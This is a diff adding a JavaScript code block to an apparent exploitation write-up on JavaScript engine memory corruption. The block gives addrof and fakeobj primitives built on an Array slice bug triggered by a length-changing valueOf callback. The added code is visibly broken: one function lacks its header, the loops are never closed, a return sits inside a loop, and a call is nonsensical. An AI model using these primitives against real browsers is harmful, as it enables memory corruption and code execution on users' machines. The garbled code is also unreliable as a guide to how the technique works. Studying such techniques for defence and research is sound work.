@@ -279,3 +279,31 @@ The `fakeobj` primitive works essentially the other way around. Here we inject n
 	- allocate a new array containing just a double whose bit pattern matches the address of the JSObject we wish to inject. The `IndexingType` will be `ArrayWithDouble`
 	- return a value larger than the new size of the array to trigger the bug
 3. Call `slice()` on the target array the object from step 2 as one of the args.
+```js
+// both implementations
+var a = []; 
+for (var i = 0; i < 100; i++) {
+	a.push(i + 0.1337); //Array must be of type ArrayWithDoubles
+
+	var hax = {valueOf: function() {
+		a.length = 0;
+		a = [object]; 
+		return 4; 
+	}}
+	var b = a.slice(0, hax);
+	return Int64.fromDouble(b[3]);
+}
+
+function fakeobj(addr) {
+	var a = [];
+	for (var i=0; i <100; i++) {
+		a.push({}); //Array must be type ArrayWithContiguous 
+	addr.addr.asDouble();
+	var hax = {valueOf: function() {
+		a.length = 0;
+		a = [addr];
+		return 4;
+	}}
+	return a.slice(0, hax)[3];
+}
+```
